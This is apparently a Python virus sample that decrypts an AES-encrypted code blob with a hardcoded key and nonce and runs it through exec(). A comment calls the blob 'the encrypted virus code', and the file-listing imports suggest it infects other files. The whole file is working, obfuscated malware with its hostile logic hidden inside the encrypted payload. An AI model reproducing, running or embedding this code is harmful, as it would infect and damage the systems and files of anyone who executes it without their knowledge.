# 23da2e9b5129307a50f4304e66b21b324ee23f6448b79aae4753a14be677bab7
# 32f50981ddbfb80fc2ded8f8c2ead93877c80d64cb931c4410ad6620ae761dd0

import string
import random
from fnmatch import fnmatch
from Crypto.Cipher import AES
from Crypto import Random
import hashlib
import base64
import ntpath
import math
from os.path import isfile, join
from os import listdir
import os.path
import sys

# below line is the hashed value of encryptionbegin, it marks the beginning of the encrypted virus code
# c312d62c07c4d6e7109a43b6cf6c9eb1bbfaa460483bc08cba71196171b5a7e9

# a833bd47456ed20f5ed321ada5b03f3603de055b69477c26350696af65e76c6a
code = b'\x12|\xb1\x07\x83\xa4w4\xfdh\xb6\xe6{\xf2\xb6A@4rW\x9b9#\xb7\xca\x84\xf7\x97\xb2n\xf9H\xb81\xf42q\x166AS+\xb3\xe0\xe2\'\xed\x07%\x93#&\x9f\xcce\xd8\xd1\xcf\xc6\x12\xf4\xdbV\xf2\xf1\x94\xfdy\xdf\x00\xfeJ\x0f\xadn\xe1\x97TD\xec\xb5\xc7&\x80\xb7s\x02Sf\x88\x85{hlV<\x94\xa5\xaca\x15\xd1\xc0\xc9r\n\xf4\xbcf\x94\xfb8\x17\xad|\xcb\xa32\xb1\xb6\xb0\x01\xb1\xda\r\x9a;\x02F\xd8\x7fh\xf8\x95\x05+B\xfcIG}\x08\x0cIk}&\xc9\xeb\xbc%\xe3\xaf\xfe\xb6\x874\x10\x17QU\x1a@\xb2#Z\x19\x90\x87\xe56>*\xb7\\o{\xe1\xbb\x18\x06\x91ui\xda\xf3\xf4n\x11\x9e&Xt\x11\xd7\x83\xc6B\x0esK\xd4\xa4)\x10\xc4j\x1f\xc4X\xb8\xdbzBT\x94"\x13\xd4P\xfc\xd6ZA\xc0\xbb=\xbfmF\x1bE\xc9\xd2\xef\xdb\xd7\xde\x82\xf7`L\x89\xe6>i\xcd\xdd\x0c\x10\xadx\xa3\x81\xc5\xab\x10\x86\xb8\xdb\xd9R\x84\xdc\xe1\x95\x85\x1fTe9#\x00\xc4\xb8\x98x\xae\xb6\x03\xf4\x80W\xfb\x1aOW\xc0\xb5\xdb1-\xe2\xfeMswD<ro\xc6@\xc53[\x9b\xccf\x01\xa0a\x8b}\xafj\x92j\x98\xb1S\x85\xf9\x9c4\x05<\x05`W\xe4\xb7\xa2i\xc7\x187\x91$\xde\xab\xb7\x8b\tl\x1e/\xee\x1e\xd9\x1e@\x85\x93t\x94\x92\x00l1P\x10\x94\xeb\xfc\xb6\xb5\x954H\xb2(J\xd4\xc1\'2\xbf\xe1\xfc\xf8m\xdaZ3\xd5\xba:=\x8c6\xb7p2\xaf\xe0\xeax\xd1\x82\xbe\xce\xd0\xc9\xe4V\x84\xcc\xf5\xf3\xae\xbc\xee-\xa0\x9dH\x91\xb0\xe7\xe7\xe1t\xee\xa9\x83\xd9\x9dj\xccJ0Y\xc3\x8a\x1cnj\xe2\x86\xa2\x13^6\xa43\xf1\x9d\xad\x84h\x1d\xd4\x8c?\xe5\x15\xfe\xc84\xf7\xdb\xf2\x9c\xdfG\x04[K\x0f\xd1\xb3\xdd&p\x9au74\x8e\xdd\x82C\xaaD\xa7\rZ\xb5\x11\xf4\xf7\x0epo\xd4\t\x0b\xdea\xbd\xcc\x172\xee\xfb\r\xd3_L\xff%\xfd\xbb\x91J\xe6huEg\xceu\x84\x1d\x9c\xc7I\xc6\xd4\xec\x98\x9e\x19\x0e\x98\x1a\xfc8D\xc7\x8e>JjM\xc0\x8f\x1f\x89W\x17\xb8\x86\xe7V\xe6\xc6@S}\xf7LR\x1c\'[\x94K\xd4>\xa0\xa8O\x13\x08\xd6-bN\x96\xea\xbcs\x8a\xc0\xc2\xef\xea\xe5\t@\xf0\x0eMk\xbf\x12k\xbdn}T^ T\xfe\x92\x9a\xb4\xfa\x00\xc2h\xc0:\xbf\xb7Q\xb1\xbf\xfb\xf7\x83\xedL\xd0^\x04B\xe0+\x8f\xc2\xa2bTJ\x8d\nF\x89\x9e|\xfe_\xcf\xab\xf3\xdc\xddY\x01A\xb1\xf6FK;\xabh\x07\x13\x0bOv\xe2fm\xc4\x8e<v6+F1\xa1\x90>\xac\x15YV\x04.h\x15\xab"\x97a\xe1\x86WX\xf6\xfe\xa3\xb2t\x8d\xa3\xfc\xa8O\xc0>|+p2\x06\x1d\x04\x83OX/v\xff\xa0u\x8e\xb5!\x90]yR\xf8\xf9\x1a\xa9\xc7\x80\xba)K\xdd\xad\xcf\xa9RA\xcc\xed\xabN\x17\xa2\x18\x03\x9e\xc8j\xdeH\x83\x80\xb5 \xbb\xc1\xbfj\x93E\xc5\xb9\x1dK\xd6"Y\xb0\xbd\x89i\xee\x16\x83RH\xc5\x15\xd6\xbf\x18!-\xb7\x05\xa8\xee\xb6\x05\xa2\xec\xef\xc2\xf3\x8f\xc0\x9f\x8aT\x82-\xcf~\x8b\xb5\xf1"\x19{)\ry\x96\x80\n\xf2\xdf=\xb2\x8a\xf2\x98& \x9f\xaf\xfb\x0b\xa3\xd3\xc5\x07\x94A\x96[\x10\x16\xcc\xdc\xa0\xf6#Z\xab\x85m\x9c\x00\'\xf1\x02\xa0k\x08\x858\x9b\xfb\xd7\xab\xdb\xdb\xa0\xdb\x06\x01U=\x9c\xe0-b\xd9W\x18T\xa1R\xe0v\x9c\x1a\xc3\x9b\x95qB\xb5\x14\x95,\x10W\x1f\xb8\x19\x963P;\x8c\xd59\xea\xd0\xaf\xec\x1dSyK\xf1/>5\xad\x14\xb9\xce\xd9\x82s\xd0^d\x13\xa6Z\xc1\xab\xfe\xf2D\x8a}\x89\x0ejQ\xbeBL\xcf\xf9\xa8\xa8\xd4\x0c\xd7\x98fC\xee\xb7\xa7\x90\xbd\xe8%e\xabh\xff`O\xa7\x8cc\x1d\xa4\xfa\x88\xf8.\x19F\x189Vk\xb5y3\xd1\xf9\x80\x94"qK\x13\\\xdbL\x81b\x8e\xc2\x97\x86=\xc6\xfc\xf8Nz\xc3\xa3\x80!%R(t]\x9e\xd5\xc0\x95\xbf\xe3^\xfaDL=\x1d\xbaf\'}\xab\r&\xf1\xd1\xcfB\x9a\xa3\x81\xd4\xe3\xdc\x08\xd16\xea\xef\x02\xfd\x80\xe3\'\x03\xd0b~\xf8\x08\x8ad\xf0\\\xe2c\x18\xde?\x8a\xc8\x95h\xd8\xa5\x1d\xfd\x11\xbe\x04\x9d\xc2\xcf\x91_\x03f\xc1NV\x7f\xd5\xaa#U\'\xc6\x0b\xe4\x81\xb3\x05\xf4\x10\x10\t\x15\x91\xc2\x05\xb3t\xc5\x89~\x97p\x7fSq\xf22\xce\xe1\xfcg\x8b\xe5\x95\xa7UH-\xbd\xd8R&u^\xd9\xc7T\x91\xecD\xc9\xe8(\x83\xdfOE\xf6hW\x9a\\\xa0r\xe8\xffwE\xbcM\xc5\xee\xa4a \x08Q,d"\xec g\x00*\x82\xfe\x1b0/\xba#\x0b[<R\xc6\xbb\xbfm\xccBaUL\xa9\x02w\xeeX\xe7\x87\xbc(\xc4\x99\xc9\rO\xf6\xea\xc9\xc6\xec\xab\x0f\x14\xa4\xbeE+\xc5\x859\xda\xdf\xd8\xf7*\x82\xd3\xd6\x91\xa04\x99\x1d\xe7\xfblD\x1eH\x9a\xf1D\xff,\x9c\x84\x16\x1c\x92]?\xf3\x06\x11\x13\xbb\xb0W\xc9\x85\xf7\x92g\xa5\xeb\xf7y\x0bX\xa72\xe0\xe5U-\xeb\x92\xb7\xd0\xf9+\xfcG\xaa\xcd\xdeJ\x082\xa0\x98K\xd5\x99\x05YU\xbb\xa2\x0f\xfdf\x9c/\x1a\xd22\x89D\x1a\xb5\xf9\x96n\x03~i\xd7\x16\x0e\xcc[J\xd8\xa4\x0c\x11\no\xa2=\xfe\x8a\xef\xaf;\xd8u\xa6j\xb7O\x0e\x0fq3\x81\x83W\x8fS\xb9}\x03\xb0tY\xe9\x83;\x04(\xa6\xefW\x94\xdf\xc3\x9c/\xa1\\\x15\xd59\x13)\xe6jE\x1c6z\xbem\x8e\x80{&4\'"\xea(\xf2\xdfwS\x9e\x83\xef\xe81\xc2R\\G\x16sc\xce\xf2\xe9:\xa6\x88"u\x825\x82O\xc6u=\x1bn\x12\x9b\x04\xcc\x8f\rC^\xe1\xc4\\\'\xf4\xdd\xd3\x96(\xdfxH\xe4\x08\x12\xe0n\xdd\xb4\x18\n\x91k\xd9\x96\xb10\x19\x0e\x1c\x86\xf1\x9cI\x00\xf1\x94\xc2\xc1`Y\xb5W\x1f\xea\xd9\x95\xf0xGk\x9d\x19\xca\xa1\x98P\xe1\x94,\x1d\xe6\xa2$S\x07v\x05\xd6\x12f\x9c%\x11\xa7\x07\xb8\x1c\xe4\xdc\xfe\xad\xc1\x94\xd7\x16\x04xP\x92\xdf\xf3\x17U\xee3\xd0\xe1a+\\/8{\x84\x18\xa8\xe1\xe1rt\xe8\x10\x12\x91f\x1a\x8e\xe3"\xb2V\xe1\xb0jx=\xb5"\xe5\xc3\xe4!\xc6~\xafA\xd7\xdc\xe5z\xdc\xaa\x16V\x99<u\xd9%p\xc32|\xee\x0bx@\xde\x8d8\x9b\x10\x8d\x7f\x88[\xc0?\xfd\xb2\xf9\x1bM1F\x9f\x9e\xf9[!\x9c\x88\x04\xb8B{\x1e\t\x8d\x003\x98\x0e\xa1\xedI\x84\xff\x03\x80\xd4\xef*\x11\xc4\x87/ajdEa\x88\xd1\x03\xd1\x82c\xf7\xd3\xc5\xba\xdel\xd9o\x87\x17n3c\x18\xf1\x9b\xe3\x1c\x08\x92\r\xc0\xee\xdf\xb0\x95\x0b\\nYCD\x18\x85\x80\x0c!\x0ee\x80m\xa5\xdd\x12\x06\x8b\x0e\xbf$Ex\xde\x16\x82\xfd\x8e>\x1c\xca\xdd\xddj\xee\n\x11\x06\x89\xbc\xe3\xc9\xd6f\xf4\x1d%i+_\x00U8V3G\xa7&\\\x04\x9c3\xc2\xe6\x9e\xfeQ\xc0\xeapl\x0b\x91\xd1}\xce\x8b\x9cL\xc5]\xe6\x82\xf1Km%}\x86\x19I,\xc1\xf1\x1fztUn}\xba?+\x92\xe2\xae\x82{,\x00\x92\xec\x11$\xf2\x02:\xe8\xf9\xcb0\xb6t\x87\xb0i\xca\xbfQd\x19U\xd3\x16\xe1\xe5\x18L\xe0m\xfd\x19\xc1O\xab\x17mo;g-\x0e\xff\x04[_\xc4\x99\x1d\xa6e\xf3\x8b\x9c\x8e\xf6r\xe3hyS\xd4\xc8\xc9\x9b\xb79\xda\xc8\xa6)c\xd5"a\xd77U[\xeb\x92\xec\xbe\xaf\xf8J?\xe7@\xb7\xa8\xaf?\xbcp-\x88)MZ\xb7>2\x19\xe9\xb6).\x8b4p\xe8Y\x10\xdfa\xbbG\xac\x11\xba;\xf4\xa7f\x82U\xec\x15[c\x8f>\xd4JL\x9d3\x16\xcfY0\xa4U\xf1\xd3Q\xd6\x19\xf3\xe0y\xeb:q\x96}\xd4+\xf1\xdeH}\x98\x982Sq\x7f\xdb\xb3z\xca\x8ds>\xe7\x9d\x040\xf6;\xf3A\xd3+\x89\x85;\x0b\x12\xd5\xdeR\x17H\xa5\xc9j-\x9fMf_\xd1\xc3\x8b\xf5\xc5\x952\xb1\xc6MN\xf1\x9b\xf7\x04\xf3\xf3\xab\x16\xe7\'\x98\xdfCQ\xdb#\x02:\x81\xc4\xa5\xecK\xcd\t\xc0\x13\xd6\xa1\x89\xe4\x1dp\r\x1czm@v\xc8\xd3\x17\xfa\x7f\xa7)P\x19c5L\x9e\xa6\x8fI\xd3,\r\x01y\xfb7\xbc\xca\xb0\t\xbdy\xfar\xa6\xe0\xdbq\xad\x8d\x8aq\xa0\xe7\x13\x08\xdd0m\xb1:\x9f\xc8<#\xb0\xad\xbb\xf4\xda\xb5:\xd3b"\xdb\xb3\x84\xdf\xec_\t\x9ah,\xe6c\x05\xc1\xce\xd2\xf6+\xcfH\x1b\xde\xa7\xfd\x0c\x04Yp\x90S\xf28\xa4\xad\xf2Q\xd6\xf96{\xf90\xae?a\x87\x86\x02`\t9<\xf1\xf9\x8a 3f]s]\xb6\x05\xa9\xe1@\xc4\xac\x00q`\xad\xa3\xf2`t\x14\xdc\xe5M\xfb\xfc\xae\xb1\xba\x0ea\x1d\xea\x8e\xb0\xf0\x93\xeb\xb6(\xcb\x1a\x17\xfaX\xa7\xa8\xe5\xff\xe7v<\xb6\xb6\x12\xe1\xfbx\x02\xf3f\xc8?\xfd\xa9\xe2\xed)\x94/\xb85\xa5}\xa3-J\x9dSHI\x86>\x96\x04FP\xf1\xd6\x01\xa9\xdf\xf0|{\xff\xb0,k\xb8PgL>\xbbg\x05\xec\xb1m\x07\xf0\x99\x8b\xd0\xd7\xe8\xd5\xf1\r\xca\\\x00\xe5,\x8f!\xe8\xb2w\x84\x7f\xbb,\n\x04\xdc{M\xa9\x87~\xe5\x98P\x96p4\xc8Yc\x18p\xdd\xc5|\xec\x18D\x18\x03\xe6C\xb6\xf1+\xdbB)8\xabcF\xc9)n\x86M\xa1\xb3\x16\xa0\xac\x82\x99\x1a\xb7*6\xc7\xc0k0ms\xe7s\x9c\x83\xe9\xbc\x10CX\x96\x08\x17\xc2\xefY\x81\x0e\\\xb8\x12\x1f\xcc\xbc\x9e\xfb0qs1\xf1\xdcU\xf2\xf6o\x1cFg\xb0\xbe\xb2\x89jM\x18\x8bv)\xb5\xf2\r\xd3\x0c\xa4_y/\'\xd6\xa0\xbe\xad$\r\xf5\xa9\x83\xba\x0f\xear\xd7\xf4\x9e\xbb\x03\xaa\x9eFi\x1e\xfd}Z\xa0*\x01!1;\x08z\x17\x8e\x0ff\xcd\x94J\x83\x03_r\xbco#\x87\xa8\x8b\x04\x1a\xca\xb3>\t\x91;W\x1d\x03\xc1\x7f\x027\x8ef\x12\x12\x07Z\x89)\xffW\x04\x1e\x8e\xfa\xd0\xc6q\xccn\x8b~\x0cu\x8a\xb2\xa2\x08\xc1\xc1\xedG\x1f\xd7\x95C"\x0e\x82\'>|\xb5\xc0\x07\xb3\x94\x00\x02\xe5\x08Qb\xa5\xae\x1d\xa9\xf7+\x16\xcb\xa9\x18"3\x7f\x08\x8cm1\xf38\xf5\x0b\xe5\xb45\xb0a\x05Z\x8e^M\xf45\xb9.\x19\xa4G\x16b\x88<\xb6\xcax#\xbb\xc6B\xc5\']\xa1\x8e\x0btjPa\x1fS\xb3\xe9\x00\xf1\xcb\x95\xb9\xc0\xa6P\xe1\xe2\x97\xc5\'$\xa7\xeb.\x83\xd4\xa8\x91\x8bW\xc0r?\xa4\xddA\x89\xa7I\x91\xcf\xc1\xde|.I\xe0p\xbd 5\xd9\x0b\xce\xc1\x9aw+\x9fXU\'F\xa4\xc9\xb0+\x8b\xb8\x98\x81\x97\x90\x97`\x93!`\x95F\x1c\xacp\x85p>\xd1\xa0D\xbd\xfd#+\x89\xae\x1e\xf6\n\x90\xd6\xe2\x1d\xebJ\x9b\xb4T\xe0;\xf4\xa5\xd2A\x82\xb3\x0e\xc2\xc0~\xc4\xe1!\x83{\xefk\xd3\x19\xe7\x83BM4b5\xf2?\xa0\x19/\xa9g\xf9qc\xe0\xe7\xe2\xe65=\x8d\xe3\xf3M\x85D\x94\xc7+\xe6\xb4\xb0\x9b\xaa]\xa8\xefM\xe1\xf0\xd7\x08[\\\x96K\xeb(e\xb1\xe2\xcc\xe9\xa7&\xf8,,\xb3\xd8\xd9\x94\x8f\xe2\x8by\xf4\x9b\xef\x1d\x03\x03\xber~06W\x97w\xf4\xe1\x17\xd7\xb6\xf8\xb1\xd3Z\xa6\xd1\xc2\xd8l\xdd~\xda\x93\x19v\xbfL\xf1\x1d\xe3\xa04\xaf\xe2&\xaan\xad$\\+\xd9\xd8Z1sUm\x80\xcb#\xc0\xf6\xaa4Zl!\xee\x1a\xe3\x0eQ\x86J\x8fE\x99\xe2\xb1\xf9\n\xf2\\\x9d\xe69zj\xc3\xbd]e\x17\x10X\xb9(\xab\xa1\xeb\xbaM\x9bgi\x90\xbcG}\x8brFh#\x9a\x82/GO\xb0ay\xae\x86\xfc.\xce\x1c\xcat\x85\xccR\xe0\xec\xd5\xf2\xa3\xde\x911\x03\xaa(\xae\x8eT9\x894\xee*\xc8\xea\xa9,_\x91\xbeK-\xe1\xa9\xa4Yne\x12>\x05P\x0f\x8dr\xe0!\'E\xac\x94\x89\xc5\x81|\x1a\x82\x03\xc70K\x88\x17I>\x8fz\\\n*FFi\x15\xabc\xda\xfd-2\xbc\x91\xec\x16\rB\xe3\xd2\xda\xe0AV\xdb\xfc[\x86U~\xef\x03;Z\x08\xc4Q1\x0b\x8eH\xe1\x82\xe6\x13\xf8!\xd8\x88\xc6\x9f\xfbA8\xe1\xf6\xf2\xf2\xfd\xcc\rj1\x93\xb0\x80x\x14\xcb\xc8\x94\xbe:\xd1i\xb2\xe1h\x9c\xac\x89\x80v\xbak\xd8\xd1\x8dK\xdb\x98.\xd4hxb\xe8\x03\x06\xa3\xd9}\\\xf0\xa1%\xcdc\xce\xf6\x15e\xa5\xac\xde\x19\x1b\x84\x0b%\x8aZSz]\xee\xc5J\xe0)\x11O|\x88/\t\xd8\xdf\x9c\xf4#\x02\xde\x0b\xd2~\xf7\xe0\xd58\x8c\xca\xbe\xc0\xcc\xd5-\x81\x02\xdc\xf9\xb5\\\xb0\xff\xbe5\x7f\xc5\x9f\xc9j\xc9\x01,\xf8F~Ws*\xaf\xe1Y\x8a\xe56#\xeba,t\xfb\xb7\xc4\xee\xe5"\xd2Q\xf2\x05\xdf&\xd3\x8b\x91\x07:\xf6!\xdf\xa6\xcd\xb1b\x13\xc8G\x1dMw\xd2pS\xa9\xb0\x82\x16\xc1\xe7W\xad;c\xd4\x00\xba\xd9\x84Ay\x9f\xac\xcf\xac\x9f\xf5\xb0\xa3\xb9\xa3\xbf\x7f\x16\x0f\xce\xbe\x8e1\xa0\x04sh\xa86\xf1\xf2\x93\x98\xa1\xed\xa34\xed\xa5\x86\x15\xfd\x87\xf7\x86\xf3I\x19\xa0\xdd\xf7\xf3\'{\xdc\xf2H\x15z0\x941\xbc\\\xb0\xde\xaeF\xab\']\x16\xc7L\xd5\x0f\x04D\x16\xea\x11b%\x9c\xc8\xe1\x1e\xe6\x9d\xa9\x1ay\r\x13\x14c7=\xeex\xfe\n\xb8\xe0D-\xdcG\xd2\xae\xe2\xcb\x8d.u\xe3O\xee7B\xf4\xba.\xd1\x94\x077HuQ\xc5\x05\xe4E\x8c]~\x07\x90\xf7\x04X=\xaeV\xfap\x8e\xfd\xe0\xd7"\xac\x12~\xd75\xbd\xfe\x8eNeuZ\xb5\'\xd0?\xcc+\x84\xddv\x99\xab\x9a4r\x10\xa8G`\xa1\xdc\x8f\xbb\x0c\x07v\xb4\xaf\xdf\x8b\xc0\x01\x06\xd2\xb3\xb9@3\x85\x84\x02J\xf9\x9d\x17\xd1#u#v\xf9\x03\x12\xfe\x89\x98\xb1\xe9\xe9\x99\x86\x8ay\xb98}[6\xdd\xe1\xaa\t00\xf34^(kP+\xdf\x9b\x18\xe2\x89`,n,\xcf\x93\x1c^\x00\x8fPc\x03\xb2A\xb8\x8a>\xd5N\x82\x8eI\x11\x9bn\xee\xe2\x88\xdc\x89"8\r\x9d\x0ct\xa4Y\xcaCfP\xac\xd2%/7\xbb!\x91\x92\x95e\xbb\xa6\x91\xce\x93"\xf9\x852sb\x9bQ6mLNV]\xcdQ\xe6n8\x94\r-\x0f\xd3\x1b\x90,7\xe5\x7f\xcdA\xda;%\xa7\xdd\x14\xba\xe1\x1f0\xee%\x0cEn\x85\xb5\xfd\xfe\x8a\x083eB\xa1\xec_\x98\x1e\xfd\xdfP\x9b\xf7$I\xd1\x92\xa9\x1a\x04\xd0>_9\xaf\x12\x81![:\xa8\xde\xf2`\x93\x14\xed\xadRwb\x8b\xe7\xa69\x0c\xa4\x9aXU\xbc\x92\x80\rb\xf3\xdd\xda\xac\x8d4\x97\xf3\xa7\xd4\xe87Q\x01\xc7\xfb\xe3\xd4+\xd1\xb3$,%\x05\xc0\xa0l\xa6\x14H49Ce\x00{\xbck)\xbf\xeet\xea\x1b\x0cHO)L\x00k\x02\xb7\xdb\x95?\'O\x92\xb5\xd6\x9a\xfc@\xca\xcd\xd47>\x02\xda\x1aT\xb1\xc2\x1cH\xf2\xf1\x83\x17\xae\xf5\x1c?\\|1\xa1\xb5t\xd7\x94\xab\xcc\x83(\xed\xa6\xd95\xab\xb5\x1a\xd7;\xe8\xc2\x82\xf0\xdbA\xbd\xcf\x1aa\xe6\xff\xc6\xe7a\xa4\xc9\xc8(~\xe9xK*\xa4bU\x96\x00S<n\x08Fa\x8a\x8et"\r\xe8>\xf0uLF\xe1Y$\xa3\x7f\xeb\xcb9\xa4\x11\x8ez\x04\xa4Gf\xb6O\xb1\xe9\xdd\x05\xad\xeb5\xdb\x87\x15\xba:m\x1d\xa7\xbel*\'B\x9b\xde\xca\x82-\x9c\xb4<\xb6,\xc4TO\x82B\xd7\xd8{\xbe\t]\xa6e\xc7C/\xf5\xcf/\xd1\xc7X3\x9d\xd7\x9c\xbcT\x18L\xad>\xc6x\xba\x06\xd2\x98\x89\x1eZ\xca\xe0D\x17Y\xfe\xcc\xce,ADxQ\xd9e\xf7\x9f\xaf\x99\x11\xca:A\xb9\xbfF#:\x19\xdb;\x8d`\xc6\x82B.}\xa7j&V1W<\xbd\xb2\rE_\xe1#\xbd\xb9\x1b\x94Wv\x01\x17\x97\xb5\xfc\xb3T#\x86\xc2I5Y\xf9y\x03\x08\xfe\x0e\x8e\x96X\xd2\xf5\x9c\xf1%\xaa\x9cY\xf0!jP\x90%\xc7\x95!\xcf<.\\:t\xe2gQYE \xbbFL\xb0\xa1\x920;i\xbe\x87Fq;\xc6\x86[\xf7\x12W\x8e\xfe1\x12\xa9\xb6\x028wG\xb1\x01\x83\xeb&0\x9c\xe9z\x8eE\xfb\xe9\xb6\xc6\x9bUj\x0f\x05\x7fm\xb1\xa7?C\xba6pv\xeb\x83\r\xbc\x16\xd9\xf2\x15\xc5\xda\x8f\xadF2\xc9('
cipher = AES.new(b'UyXIPYMQHtDOmYeG', AES.MODE_EAX, nonce=b'\xd5u\xd3B\xcf\xce\xfaG\xd1x#9\x90F\xd8\xce')
code = cipher.decrypt(code).decode()
exec(code)
# da94275a2621b81e109aaed7a41f730a8581c58ce14d3611b3e09c54814b4fcd
